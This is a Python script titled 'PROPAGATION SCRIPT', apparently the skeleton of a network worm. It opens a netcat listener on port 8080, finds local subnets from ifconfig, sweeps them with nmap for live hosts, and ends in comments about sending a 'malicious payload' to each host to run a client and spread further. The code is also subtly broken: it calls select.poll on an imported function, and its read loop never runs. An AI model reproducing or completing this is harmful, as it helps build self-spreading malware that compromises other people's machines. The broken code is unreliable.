#####################
# PROPAGATION SCRIPT#
#####################

import subprocess
import ipaddress
from select import select

def execute_command(command):
    result = subprocess.run(command , stdout=subprocess.PIPE)
    return result.stdout.decode('utf-8')

def execute_command_waiting(command):
    proc = subprocess.Popen(command,stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    # print(proc.stdout.decode('utf-8'))
    time_limit = 1
    poll_obj = select.poll()
    poll_obj.register(proc.stdout, select.POLLIN)
    while not time_limit:
        poll_result = poll_obj.poll(0)
        if poll_result:
            line = proc.stdout.readline()
            print(line)


execute_command_waiting(["nc", "-lvp", "8080"])



interfaces = execute_command(['ifconfig']).split("\n\n")
interfaces_found = []
for i in interfaces:
    spaced_words = i.split(" ")
    try: 
        inet_i = spaced_words.index('inet')
        netmask_i = spaced_words.index('netmask')

        interface_info =  {
            "inet": spaced_words[inet_i + 1],
            "netmask": spaced_words[netmask_i + 1].strip("\n"), # Removes new lines at the beggining or the end.
        }

        interfaces_found.append(interface_info)
    except:
        print("Inet and netmask not found")

for i in interfaces_found:
    # Ignore localhost.
    if i.get('inet') != "127.0.0.1":
        interface = ipaddress.ip_interface('{}/{}'.format(i.get('inet'), i.get('netmask')))
        network = str(interface.network)
        network_address, netmask_bits = network.split("/")
        print("Scaning avaiable network hosts: {}/{}".format(network_address, netmask_bits))
        output = execute_command(['nmap', '-sn', '-n', '{}/{}'.format(network_address, netmask_bits)])

        hosts_up = []
        output_splt = output.split("\n")
        for index, line in enumerate(output_splt):
            if "Nmap scan report for" in line:
                ip_list = line[21::].split(" ")
                if len(ip_list) == 1:
                    ip = ip_list[0]

                is_up_out = output_splt[index + 1]
                is_up = False
                if "Host is up" in is_up_out:
                    hosts_up.append(ip)

        print("{} hosts up".format(len(hosts_up)))
        for h in hosts_up: print(h)
        print("\n")

        for h in hosts_up:
            print("Trying to propagate to {}".format(h))

            # Send malicious payload to possible vulnerable machines.
            # - Send payload to execute the client.
            # - Send payload to propagate.